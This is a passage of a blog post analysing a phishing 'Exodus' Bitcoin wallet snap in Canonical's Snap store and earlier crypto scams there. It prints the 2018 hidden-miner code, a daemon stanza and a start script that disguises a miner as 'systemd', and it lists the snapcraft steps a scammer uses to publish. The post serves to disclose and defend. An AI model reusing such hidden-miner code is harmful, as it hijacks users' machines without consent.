<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://popey.com/blog/2024/02/exodus-bitcoin-wallet-490k-swindle/">Original</a>
    <h1>Exodus Bitcoin Wallet: $490k swindle</h1>
    
    <div id="readability-page-1" class="page"><div role="main"><div><div><article role="main"><p><strong>tl;dr</strong>: A Bitcoin investor was recently scammed out of 9 Bitcoin (worth around $490K) in a fake “Exodus wallet” desktop application for Linux, published in the Canonical Snap Store. This isn’t the first time, and if nothing changes, it likely won’t be the last.</p><p><a href="https://www.walletexplorer.com/wallet/32394c8892f2076c"><img src="https://angelolloti.com/blog/images/2024-02-20/byebyebitcoin50.png" alt="Bye bye bitcoin"/></a></p><p><em>This post turned out longer than I expected. So if you don’t have the time there’s a briefer summary at the bottom under “In summary (the tl;dr)” along with my suggestions on what Canonical should do now.</em></p><p>We talked about this in <a href="https://linuxmatters.sh/23/">episode 23</a> of <a href="https://linuxmatters.sh/">Linux Matters Podcast</a>, if you prefer a truncated audio version. The episode was recorded on 13th February 2024, and published on 20th February whereas this blog post is current as of the publication date.</p><p><a href="https://linuxmatters.sh/23/"><img src="https://angelolloti.com/blog/images/2024-02-20/linuxmatters-banner-3000x750_30.png" alt="Scam exodus app"/></a></p><p><em>Patreon <a href="https://linuxmatters.sh/support">supporters</a> of <a href="https://linuxmatters.sh/">Linux Matters</a> can get the show a day early, and without adverts.</em> 🙏</p><h2 id="introduction">Introduction</h2><p>For clarity, I used to work for Canonical on the Snapcraft team, but I no longer do. Now, I’m just some community guy who wants Ubuntu and Snapcraft to be a success. I’m writing this in the hope Canonical will fix its processes so reputation-damaging events like this don’t keep happening.</p><p>All of the words below are based on my external perspective of what happened. However, I have also drawn on my historic internal knowledge of the processes and how we dealt with this in the past. Though things may have changed in the two years since I left the company.</p><h2 id="what-happened">What happened</h2><p>An application called “Exodus” was published in the Canonical Snap store on 6th February 2024. (<em>In the <a href="https://linuxmatters.sh/23/">podcast episode</a>, I mistakenly said the application had been published for 2 days. This is inaccurate. It was published for 6 days)</em>.</p><p>The application had a couple of screenshots, an icon, and a detailed description.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_crop_100.jpeg"><img src="https://angelolloti.com/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_crop_50.jpeg" alt="Exodus in the Snap store"/></a></p><p>Early on Sunday 12th February a new <a href="https://forum.snapcraft.io/">Snapcraft forum</a> user named “castle” <a href="https://forum.snapcraft.io/t/exodus-movement-exod/38904">started</a> a short thread titled “<a href="https://forum.snapcraft.io/t/exodus-movement-exod/38904">Exodus - Movement Exod</a>”. In it, they enquired:</p><blockquote><p>Can anyone tell if the Exodus wallet in Ubuntu’s software store is a scam? My wallet is empty after recovering and it shows a recent transaction of my entire balance sent to an address. I never made this transaction.</p></blockquote><p>I initially spotted this question early on that Sunday evening, some nine or ten hours after it was posted.</p><p><strong>Spoiler:</strong> <em>This “Exodus” application published in the Snap store was indeed a scam application. There is a genuine <a href="https://www.exodus.com/">organisation</a> that developed a real, seemingly ’legitimate’ cryptocurrency wallet application. This is not that.</em></p><h2 id="brief-analysis">Brief analysis</h2><p>Without wishing to give scammers a “<em>How to pass for a genuine application</em>” guide, I’ve taken a look at this one and present the details here so users are empowered to make educated decisions.</p><h3 id="store-page">Store page</h3><p>The “Exodus” application was published in the Snap store at <a href="https://snapcraft.io/exodus">https://snapcraft.io/exodus</a> but has subsequently been ‘quarantined’ by Canonical.</p><p><em>When a snap is ‘quarantined’, typically the owner’s account is disabled, their published snaps are moved to a Canonical-owned account, and the published revisions are ‘unpublished’. The net result is the application no longer appears in search results, visiting the store page returns a ‘404’, and the publisher can no longer access the package.</em></p><p>Below is a screen capture of the full Exodus Snap store page I took at the time.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_100.jpeg"><img src="https://angelolloti.com/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_50.jpeg" alt="Exodus in the Snap store"/></a></p><p>The store page looks somewhat legitimate, to the untrained eye. The publisher’s name was “Movement Exod (movementexod)”, which also adds <em>some</em> legitimacy. It was published in the “Finance” category in the store.</p><p>The logo and screenshots are from the official upstream Exodus application. A lengthy text description provides some simple marketing about the platform.</p><p>Note the coloured map at the bottom of the page has multiple countries highlighted. This indicates the snap had (at the time of screenshot) at least ten installs in different countries. Therefore, our user is <strong>not</strong> the only person with this malware installed on their PC.</p><p>The application could also be viewed in the desktop “App Centre” (previously “Ubuntu Software”, a.k.a. “GNOME Software”) application storefront.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/gnome-software_100.png"><img src="https://angelolloti.com/blog/images/2024-02-20/gnome-software_50.png" alt="Exodus in the Ubuntu Store"/></a></p><p>Interestingly we learned via their <a href="https://forum.snapcraft.io/t/exodus-movement-exod/38904/6">responses</a> that the desktop GUI was likely the way the “castle” user installed the Exodus application on their system. That’s pertinent given a later response where they ask why the snap is presented as “Safe” in the storefront. They likely saw a button like this in the “App Centre”, which gave them some confidence in the application.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/safe.png"><img src="https://angelolloti.com/blog/images/2024-02-20/safe.png" alt="Exodus in the Snap store"/></a></p><p>Furthermore the title of the Snapcraft web frontend says “<em>Snaps are containerised software packages that are simple to create and install. They auto-update and are safe to run.</em>”</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/safe-to-run_100.png"><img src="https://angelolloti.com/blog/images/2024-02-20/safe-to-run_100.png" alt="Snapcraft title"/></a></p><p><em>Are they though?</em></p><h3 id="a-peek-inside">A peek inside</h3><p>I wanted to take a look at the application itself. So on my workstation, in a separate virtual machine, I ran <code>snap download exodus</code> to download, but not install the application. I don’t have any cryptocurrency wallets on my system, but I didn’t know what the application might try to do, so for safety I didn’t run it directly on my computer.</p><p><em>A snap is just a squashfs file, typically containing an application, libraries, assets and metadata.</em></p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~/temp$ file exodus_4.snap 
</span></span><span><span>exodus_4.snap: Squashfs filesystem, little endian, version 4.0, xz compressed, 
</span></span><span><span>    <span>26962719</span> bytes, <span>110</span> inodes, blocksize: <span>131072</span> bytes, created: Fri Feb  <span>9</span> 10:50:58 <span>2024</span>
</span></span></code></pre></div><p>I unpacked the snap with <code>unsquashfs</code> and briefly poked around at the resulting files.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~/temp$ unsquashfs exodus_4.snap 
</span></span><span><span>Parallel unsquashfs: Using <span>8</span> processors
</span></span><span><span><span>79</span> inodes <span>(</span><span>788</span> blocks<span>)</span> to write        
</span></span><span><span>                                                           
</span></span><span><span><span>[=========================================================================</span>/<span>]</span> 867/867 100%
</span></span><span><span>                                                           
</span></span><span><span>created <span>79</span> files                       
</span></span><span><span>created <span>31</span> directories
</span></span><span><span>created <span>0</span> symlinks    
</span></span><span><span>created <span>0</span> devices                
</span></span><span><span>created <span>0</span> fifos                        
</span></span><span><span>created <span>0</span> sockets
</span></span><span><span>created <span>0</span> hardlinks
</span></span></code></pre></div><p>Notably much of the metadata in the <code>snap.yaml</code> file was still the developer defaults such as “Single-line elevator pitch for your amazing snap”.</p><div><pre tabindex="0"><code data-lang="yaml"><span><span><span>alan@vm:~/temp$ cat squashfs-root/meta/snap.yaml </span>
</span></span><span><span><span>name</span>: <span>exodus</span>
</span></span><span><span><span>version</span>: <span>1.0.0</span>
</span></span><span><span><span>summary</span>: <span>Single-line elevator pitch for your amazing snap</span>
</span></span><span><span><span>description</span>: |<span>
</span></span></span><span><span><span>  This is my-snap&#39;s description. You have a paragraph or two to tell the
</span></span></span><span><span><span>  most important story about your snap. Keep it under 100 words though,
</span></span></span><span><span><span>  we live in tweetspace and your description wants to look good in the snap
</span></span></span><span><span><span>  store.</span>  
</span></span><span><span><span>apps</span>:
</span></span><span><span>  <span>exodus</span>:
</span></span><span><span>    <span>command</span>: <span>snap/command-chain/desktop-launch $SNAP/bin/exodus</span>
</span></span><span><span>    <span>plugs</span>:
</span></span><span><span>    - <span>desktop</span>
</span></span><span><span>    - <span>desktop-legacy</span>
</span></span><span><span>    - <span>gsettings</span>
</span></span><span><span>    - <span>opengl</span>
</span></span><span><span>    - <span>wayland</span>
</span></span><span><span>    - <span>x11</span>
</span></span><span><span>    - <span>network</span>
</span></span><span><span>    - <span>home</span>
</span></span><span><span>    <span>command-chain</span>:
</span></span><span><span>    - <span>snap/command-chain/snapcraft-runner</span>
</span></span><span><span>    - <span>snap/command-chain/desktop-launch</span>
</span></span></code></pre></div><p>Further investigation revealed this was an application developed using <a href="https://flutter.dev/">Flutter</a>.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~/temp$ ldd squashfs-root/bin/exodus | grep flutter
</span></span><span><span>        libflutter_linux_gtk.so 
</span></span><span><span>            <span>=</span>&gt; /home/alan/temp/squashfs-root/bin/lib/libflutter_linux_gtk.so <span>(</span>0x00007f69ee800000<span>)</span>
</span></span></code></pre></div><p>The application binary was quite small, and there weren’t a lot of bundled libraries beyond the essentials, potentially indicating limited features.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~/temp$ ls -lh squashfs-root/bin/exodus
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan 24K Feb  <span>9</span> 10:49 squashfs-root/bin/exodus
</span></span></code></pre></div><h2 id="genuine-or-not-tho">Genuine or not tho?</h2><p><em>Some software vendors link directly to the Snap store page for their software packages - others do not.</em></p><p>I looked on the upstream <a href="https://www.exodus.com/">Exodus website</a> to see if there was any mention of the snap.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/exodus-website.png"><img src="https://angelolloti.com/blog/images/2024-02-20/exodus-website.png" alt="Official Exodus electron app"/></a></p><p>Notably the snapped application was neither linked nor even mentioned. There are deb and zip files for a Linux build of their Exodus Wallet application, though.</p><p>I downloaded and unpacked these and observed significant differences to the application in the Snap store. The official app isn’t Flutter-based, it’s built using <a href="https://www.electronjs.org/">Electron</a>, which bundles a Chromium-based runtime.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~/temp/upstream$ unzip -qq exodus-linux-x64-24.2.12.zip 
</span></span><span><span>alan@vm:~/temp/upstream$ ll Exodus-linux-x64/
</span></span><span><span>total <span>217800</span>
</span></span><span><span>drwxr-xr-x <span>4</span> alan alan      <span>4096</span> Feb  <span>8</span> 18:02 ./
</span></span><span><span>drwxrwxr-x <span>3</span> alan alan      <span>4096</span> Feb <span>20</span> 10:04 ../
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan    <span>136037</span> Feb  <span>8</span> 18:02 chrome_100_percent.pak
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan    <span>196924</span> Feb  <span>8</span> 18:02 chrome_200_percent.pak
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan   <span>1322280</span> Feb  <span>8</span> 18:02 chrome_crashpad_handler*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan     <span>54096</span> Feb  <span>8</span> 18:02 chrome-sandbox*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan <span>173385472</span> Feb  <span>8</span> 18:02 Exodus*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan       <span>271</span> Feb  <span>8</span> 18:02 exodus.desktop*
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan  <span>10717392</span> Feb  <span>8</span> 18:02 icudtl.dat
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan       <span>610</span> Feb  <span>8</span> 18:02 install-desktop-file.sh*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan    <span>252120</span> Feb  <span>8</span> 18:02 libEGL.so*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan   <span>2882824</span> Feb  <span>8</span> 18:02 libffmpeg.so*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan   <span>6613816</span> Feb  <span>8</span> 18:02 libGLESv2.so*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan   <span>4292368</span> Feb  <span>8</span> 18:02 libvk_swiftshader.so*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan   <span>7469008</span> Feb  <span>8</span> 18:02 libvulkan.so.1*
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan      <span>1096</span> Feb  <span>8</span> 18:02 LICENSE
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan   <span>9242930</span> Feb  <span>8</span> 18:02 LICENSES.chromium.html
</span></span><span><span>drwxr-xr-x <span>2</span> alan alan      <span>4096</span> Feb  <span>8</span> 18:02 locales/
</span></span><span><span>drwxr-xr-x <span>2</span> alan alan      <span>4096</span> Feb  <span>8</span> 18:02 resources/
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan   <span>5499616</span> Feb  <span>8</span> 18:02 resources.pak
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan    <span>267462</span> Feb  <span>8</span> 18:02 snapshot_blob.bin
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan    <span>626313</span> Feb  <span>8</span> 18:02 v8_context_snapshot.bin
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan         <span>6</span> Feb  <span>8</span> 18:02 version
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan       <span>107</span> Feb  <span>8</span> 18:02 vk_swiftshader_icd.json
</span></span></code></pre></div><p>I initially <a href="https://forum.snapcraft.io/t/exodus-movement-exod/38904/2">replied</a> to the thread, letting the user know this looked dodgy, and certainly not official. The first revision of my reply:</p><blockquote><p>It certainly doesn’t look official to me, based on the following simple check:</p><ul><li>The upstream Exodus app is available as a deb and zip. Inside those packages there’s an electron app.</li><li>The exodus snap is a flutter application, not built using electron.</li></ul><p>So it could be someone making their own Exodus application, it doesn’t look official.</p></blockquote><h2 id="digging-deeper">Digging deeper</h2><p>I wondered what the application did though. So I spun up a <a href="https://github.com/quickemu-project/quickemu">Quickemu</a> virtual machine running Ubuntu 22.04 then installed and ran the snap.</p><p><code>sudo snap install exodus_4.snap --dangerous</code></p><p>Once launched, the dodgy Exodus app shows a window containing a branded background overlayed with input fields and buttons.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/scam-exodus-app-1.png"><img src="https://angelolloti.com/blog/images/2024-02-20/scam-exodus-app-1_70.png" alt="Scam exodus app"/></a></p><p>Clicking the help icon reveals the very brief documentation. The user is expected to input their twelve-word recovery phrase, to “import” their Exodus wallet.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/scam-exodus-app-2.png"><img src="https://angelolloti.com/blog/images/2024-02-20/scam-exodus-app-2_70.png" alt="Scam exodus app"/></a></p><p>“You need to write your 12-words phrase to import wallet. If your wallet is not imported, it means it is either not created or you are entering incorrect data. Before you click the import wallet button, <strong>double-check the entered phrase</strong>”</p><h3 id="danger-zone">Danger Zone</h3><p><strong>It’s mentioned in bold on the upstream Exodus site, and their subreddit, that users should never enter their twelve-word wallet recovery phrase, and that Exodus will never ask for this information.</strong></p><p><a href="https://angelolloti.com/blog/images/2024-02-20/never-1.png"><img src="https://angelolloti.com/blog/images/2024-02-20/never-1_45.png" alt="Never 1"/></a></p><p>“❗ Exodus Staff will NEVER ask for sensitive information, including passwords, 12-word phrases or private keys.”</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/never-2.png"><img src="https://angelolloti.com/blog/images/2024-02-20/never-2_45.png" alt="Never 1"/></a></p><p>“Exodus will never ask you for your 12-word (secret) phrase. Exodus will never as for your password. Exodus will never ask you to visit a link except for our official website at <a href="https://www.Exodus.com">www.Exodus.com</a>”</p><h2 id="get-lost-fat-wallet-httpswwwyoutubecomwatchvyapx6miryyy">Get lost, fat wallet <a href="https://www.youtube.com/watch?v=yApx6MirYyY">🔗</a></h2><p>With that warning noted, I typed nonsense in the boxes and pressed the button.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/scam-exodus-app-3.png"><img src="https://angelolloti.com/blog/images/2024-02-20/scam-exodus-app-3_70.png" alt="Scam exodus app"/></a></p><p><strong>“❗ You (sic) wallet is not imported. You (sic) data is not valid!”</strong></p><p>My hunch was that the application poked some online API to unlock “my” wallet. So in the background, I had <a href="https://snapcraft.io/bandwhich">bandwhich</a> running in a terminal.</p><p><em>I know tools like <code>tcpdump</code> or Wireshark exist, along with all manner of other deep packet analysis tools. I just wanted to give the application a quick ‘shake’ to know if it tried to do something online.</em></p><p>Sure enough, there were a few requests sent to a Linode IP, and others to Cloudflare.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/scam-exodus-app-4.png"><img src="https://angelolloti.com/blog/images/2024-02-20/scam-exodus-app-4_70.png" alt="Scam exodus app"/></a></p><p>Visiting one of those IPs redirects to <a href="https://www.exchangerate-api.com/">https://www.exchangerate-api.com/</a> who are “The Accurate &amp; Reliable
Exchange Rate API”. Unsurprisingly, the API call failed because I entered a garbage wallet recovery phrase.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/exchangerate-api.png"><img src="https://angelolloti.com/blog/images/2024-02-20/exchangerate-api_60.png" alt="Exchange rate API"/></a></p><h2 id="bad-news">Bad news</h2><p>My untested theory is that if I had entered a valid recovery phrase, my online wallet would be accessed, and then emptied via an API call. I presume this is what happened to “castle”.</p><p>I edited my <a href="https://forum.snapcraft.io/t/exodus-movement-exod/38904/2">response</a> to let the user know what I’d discovered and tagged the security team in the thread.</p><blockquote><p>It certainly doesn’t look official to me, based on the following simple check:</p><ul><li>The upstream Exodus app is available as a deb and zip. Inside those packages there’s an electron app.</li><li>The exodus snap is a flutter application, not built using electron.</li></ul><p>So it could be someone making their own Exodus application, it doesn’t look official.</p><p>I installed the snap in a separate VM. It opens with a “Restore Wallet” dialog. If I enter random letters, it connects to some API at <a href="https://www.exchangerate-api.com/">https://www.exchangerate-api.com/</a> and fails (because I didn’t enter a real wallet phrase).</p><p>Sadly, looks very dodgy.</p><p>I’ve sent an email to the security team. Also @security ^^</p></blockquote><p>Separately, I also emailed the security team at Canonical and reported the application via the web form on the Exodus page in the Snap store.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/report-this-app-1.png"><img src="https://angelolloti.com/blog/images/2024-02-20/report-this-app-1.png" alt="Report this app link"/></a></p><p>The “Report this app” link is at the bottom of every Snap store page on <a href="https://snapcraft.io/">https://snapcraft.io/</a>. It takes seconds to fill in.</p><p><a href="https://angelolloti.com/blog/images/2024-02-20/report-this-app-2_100.png"><img src="https://angelolloti.com/blog/images/2024-02-20/report-this-app-2_70.png" alt="Report this app form"/></a></p><p>That’s about as much as I could do for now.</p><h2 id="how-does-this-happen-an-aside">How does this happen? (an aside)</h2><p>How is it that people can so easily publish scam Bitcoin wallet applications in the Snap store?</p><p>Frankly, it’s by design. One of the goals is to automate the whole Snapcraft publishing and review pipeline so there’s fewer (expensive and slow) humans in the loop.</p><p>To register a name for any application in the store, all a scammer needs is a store account. They can use any old email address, and create a store account in minutes. They don’t need to pay, give a business address or validate their identity with a government ID.</p><p>Once they have a store account, they can login with the command-line <code>snapcraft</code> tool, used for building their dodgy snap.</p><p><code>snapcraft login MySuperGenuineAndLegitEmailHonestGuv@example.com</code></p><p>Then register the unique name for their dodgy snap.</p><p><code>snapcraft register mysuperbadwallet</code></p><p>Writing the application is not beyond any semi-competent app developer. Packaging the program as a snap is well documented, and comes with free community support. Although I imagine they’d have to ask for help with packaging their “<em>Modern network-enabled desktop application</em>” rather than with a “<em>Scam Bitcoin Wallet app</em>”.</p><p>The next step is to validate that the package will pass the automated Snap store review tools. Simply run <code>snap-review mysuperbadwallet.snap</code> and fix any errors it reports.</p><p>Uploading is as simple as <code>snapcraft upload mysuperbadwallet.snap --release=stable</code>. Once it’s uploaded and processed, the package will be <em>immediately</em> searchable, and available for <em>anyone</em>, almost <em>anywhere</em> to download, install and run it.</p><p>No humans in the loop. What could possibly go wrong?</p><p><a href="https://en.wikipedia.org/wiki/WarGames"><img src="https://angelolloti.com/blog/images/2024-02-20/humansoutoftheloop.png" alt="Removing humans from the process never caused problems in Hollywood! /s"/></a></p><h2 id="further-research">Further research</h2><p><em>Back to the scam Exodus Wallet snap…</em></p><p>The snapped application will have access to the <code>$HOME</code> directory, but not any hidden files or directories within home. This has always been seen as a useful protection against an application grubbing around in hidden folders, hoovering up wallets, ssh &amp; GPG keys, and other secrets.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~$ snap connections exodus
</span></span><span><span>Interface                 Plug                    Slot                             Notes
</span></span><span><span>content<span>[</span>gnome-3-28-1804<span>]</span>  exodus:gnome-3-28-1804  gnome-3-28-1804:gnome-3-28-1804  -
</span></span><span><span>content<span>[</span>gtk-3-themes<span>]</span>     exodus:gtk-3-themes     gtk-common-themes:gtk-3-themes   -
</span></span><span><span>content<span>[</span>icon-themes<span>]</span>      exodus:icon-themes      gtk-common-themes:icon-themes    -
</span></span><span><span>content<span>[</span>sound-themes<span>]</span>     exodus:sound-themes     gtk-common-themes:sound-themes   -
</span></span><span><span>desktop                   exodus:desktop          :desktop                         -
</span></span><span><span>desktop-legacy            exodus:desktop-legacy   :desktop-legacy                  -
</span></span><span><span>gsettings                 exodus:gsettings        :gsettings                       -
</span></span><span><span>home                      exodus:home             :home                            -
</span></span><span><span>network                   exodus:network          :network                         -
</span></span><span><span>opengl                    exodus:opengl           :opengl                          -
</span></span><span><span>wayland                   exodus:wayland          :wayland                         -
</span></span><span><span>x11                       exodus:x11              :x11                             -
</span></span></code></pre></div><p>But this application didn’t <em>need</em> to do that. All it needed was to look vaguely legit, and ask for a recovery phrase, then use the automatically-connected <code>network</code> interface to poke an online API to do their evil bidding.</p><p>Pretty clever, really.</p><p>I wondered if there might be others affected by this application. I did a few online searches to see if anyone had mentioned the snap. The only post I found was in a <a href="https://boards.4chan.org/biz/thread/57569971/exodus-wallet-help">thread on 4chan</a> (warning, 4chan link, duh), timed similarly to the Snapcraft forum thread.</p><p>In the 4chan thread, they revealed similar details to the Snapcraft discussion. However, they also pasted the transaction ID and the Bitcoin wallet the funds had been sent to. A little over 9 BTC was sent to one destination. At the time of writing that amount of Bitcoin was worth in the region of $490K, but that value changes often.</p><p><a href="https://www.walletexplorer.com/wallet/32394c8892f2076c"><img src="https://angelolloti.com/blog/images/2024-02-20/byebyebitcoin50.png" alt="Bye bye bitcoin"/></a></p><p>I didn’t find any other contemporary reports of people being suckered by this snap. But then again, if someone got suckered, they might be inclined to keep it to themselves, or only talk about it on anonymous places like 4chan!</p><h2 id="gone-but-not-forgotten">Gone, but not forgotten</h2><p>The Canonical security team responded to me late on the same Sunday night to say ’thanks’ and that the application had already been removed from the store. Probably as a result of me hitting the “Report this app” button. It’s good to see that they respond promptly on the weekend.</p><p>That’s not the end of the story though. While the application is now in ‘quarantine’, and cannot be downloaded, <strong>the scam Exodus wallet application is still installed on machines out in the wild</strong>. Nothing seems to have been done to solve that.</p><p>The Exodus Wallet snap is a ticking timebomb out there on who knows how many computers. Anyone who installed it between 6th Feb and 12th Feb 2024 could one day open it, erroneously thinking it’s official, type in their wallet recovery code and lose everything.</p><h2 id="not-the-first-crypto-rodeo-aside">Not the first crypto rodeo (aside)</h2><p>This isn’t the first time a cryptocurrency scam has been published in the Snap store.</p><h3 id="minercraft">MinerCraft</h3><p>Back in May 2018, when I <em>was</em> working for Canonical, we had one of our first high-profile crypto incidents. A bad actor downloaded existing game snaps from the store, unpacked and re-packed them with a bonus cryptocurrency miner on board.</p><p>They achieved this by adding a snippet to the <code>snapcraft.yaml</code> that launched a simple background daemon once the 2048buntu snap was installed.</p><div><pre tabindex="0"><code data-lang="yaml"><span><span>   <span>deamonx</span>:
</span></span><span><span>     <span>command</span>: <span>command-deamonx.wrapper</span>
</span></span><span><span>     <span>daemon</span>: <span>simple</span>
</span></span><span><span>     <span>plugs</span>:
</span></span><span><span>     - <span>network</span>
</span></span><span><span>     - <span>network-bind</span>
</span></span><span><span>     - <span>home</span>
</span></span></code></pre></div><p>The <code>command-deamonx.wrapper</code> was a simple script to setup the environment, which then launched a further script called <code>start</code>.</p><div><pre tabindex="0"><code data-lang="bash"><span><span><span>#!/bin/sh
</span></span></span><span><span><span></span>export PATH<span>=</span><span>&#34;</span>$SNAP<span>/usr/sbin:</span>$SNAP<span>/usr/bin:</span>$SNAP<span>/sbin:</span>$SNAP<span>/bin:</span>$PATH<span>&#34;</span>
</span></span><span><span>export LD_LIBRARY_PATH<span>=</span><span>&#34;</span>$LD_LIBRARY_PATH<span>:</span>$SNAP<span>/lib:</span>$SNAP<span>/usr/lib:</span>$SNAP<span>/lib/x86_64-linux-gnu:</span>$SNAP<span>/usr/lib/x86_64-linux-gnu:</span>$SNAP<span>/usr/lib/x86_64-linux-gnu/mesa-egl:</span>$SNAP<span>/usr/lib/x86_64-linux-gnu/mesa&#34;</span>
</span></span><span><span>export LD_LIBRARY_PATH<span>=</span>$SNAP_LIBRARY_PATH:$LD_LIBRARY_PATH
</span></span><span><span>exec <span>&#34;desktop-launch&#34;</span> <span>&#34;</span>$SNAP<span>/start&#34;</span> <span>&#34;</span>$@<span>&#34;</span>
</span></span></code></pre></div><p>The <code>start</code> script launched a miner, sending any mined crypto to the publisher of the dodgy snap, who hid behind a protonmail account.</p><div><pre tabindex="0"><code data-lang="bash"><span><span><span>#!/bin/bash
</span></span></span><span><span><span></span>
</span></span><span><span>currency<span>=</span>bcn
</span></span><span><span>name<span>=</span>2048buntu
</span></span><span><span>
</span></span><span><span>
</span></span><span><span><span>{</span> <span># try</span>
</span></span><span><span>/snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency <span>1</span> -g
</span></span><span><span><span>}</span> <span>||</span> <span>{</span> <span># catch</span>
</span></span><span><span>cores<span>=(</span><span>$(</span>grep -c ^processor /proc/cpuinfo<span>)</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>if</span> <span>((</span> $cores &lt; <span>4</span> <span>))</span>; <span>then</span>
</span></span><span><span>    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency <span>1</span>
</span></span><span><span><span>else</span>
</span></span><span><span>    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency <span>2</span>
</span></span><span><span><span>fi</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Once published these “Games with benefits” were downloaded by perhaps a hundred or more users. Along with the game they all got a bonus crypto miner running in the background on their computer.</p><p>Perhaps amusingly, the miner was disguised as a process called <code>systemd</code>, which could plausibly &amp; legitimately be consuming processing time on a client computer.</p><p>Canonical was <a href="https://github.com/canonical/snapcraft.io/issues/651">notified</a> via GitHub issue, by someone who spotted this early on Friday 11th May. I found out on Saturday morning while away from my PC, watching a football game. I pinged around some people out-of-hours and we had the applications unlisted from the store.</p><p>The following week, while back at our desks, and after considerable discussion and rumination, we figured out a plan to <em>un-minerize</em> the client machines. For clients, the Snap store is effectively anonymous, so we couldn’t notify people by email or popup that their machine was compromised.</p><p>We considered the options and eventually decided to pull a benevolent version of the <a href="https://www.theguardian.com/technology/2009/jul/17/amazon-kindle-1984">Amazon Kindle 1984 debacle</a>. We took ownership of the three games, re-packaged them <em>without</em> the crypto miner, and published that as an update to the Snap store.</p><p>Anyone who’d had the game+miner installed would get an automatic update, typically within a few hours of powering their computer on. This meant they could keep the game, and we’d throw away the miner.</p><p>The result being there were no longer versions of the miner running on client machines.</p><p>Now, some might argue this was a bad way to do it, and perhaps they’re right. It honestly felt like the least-worst option at the time though.</p><p><em>Thinking about this in retrospect, we likely could have done something better here. The contents could have been replaced by a largely empty snap, which opens a URL in the default browser when opened. That URL could point to an official Snapcraft forum page which details an up-to-date list of quarantined snaps, and why they were removed.</em></p><p>Canonical published a <a href="https://blog.ubuntu.com/2018/05/15/trust-and-security-in-the-snap-store">blog post</a> once word got out. I’ve personally never been very happy with that non-response and wasn’t involved in the drafting of it. But it is what it is.</p><h3 id="leaky-ledger-live">Leaky Ledger Live</h3><p>Skipping forward, between 16th and 18th September 2023, someone uploaded a “Ledger Live” Bitcoin wallet snap to the Snap store. Ten days later, a user <a href="https://forum.snapcraft.io/t/phishing-app-on-the-snap-store-is-my-computer-compromised/37045">reported</a> that they’d been scammed out of $10K by the “Ledger Live” snap, published in the Snap store.</p><p>In a post titled “<a href="https://forum.snapcraft.io/t/phishing-app-on-the-snap-store-is-my-computer-compromised/37045">Phishing app on the snap store – is my computer compromised?</a>” they asked:</p><blockquote><p>The <a href="https://snapcraft.io/ledgerlive">https://snapcraft.io/ledgerlive</a> app is a phishing app disguising as the official app for <a href="https://www.ledger.com/">https://www.ledger.com/</a></p><p>The way it works is that it queries you for your backup code (a list of words). In a dumb lapse of judgement I was scammed by this app and lost a substantial amount of money.</p><p>What worries me more is that my computer/passwords/files could be compromised. But if I understand it correctly, snaps are isolated somehow? Could it have read my filesystem?</p><p>What do you recommend I do?</p></blockquote><p>A similar thread at the same time was <a href="https://www.reddit.com/r/ledgerwallet/comments/16tqe79/warning_snap_version_of_liveledger_is_fraudulent/">reported</a> in <a href="https://www.reddit.com/r/ledgerwallet/">/r/ledgerwallet</a> on <a href="https://www.reddit.com/">Reddit</a>. So again, likely the same person doing both reports.</p><blockquote><p>I just got scammed for about 10.000 USD by <a href="https://snapcraft.io/ledgerlive">https://snapcraft.io/ledgerlive</a></p><p>I hadn’t used my ledger in years and stupidly entered the 24 word passpharse into the app.</p><p>I’ll see how I’ll try to report this to snap, but just wanted to put the warning out there.</p></blockquote><p>They followed up <a 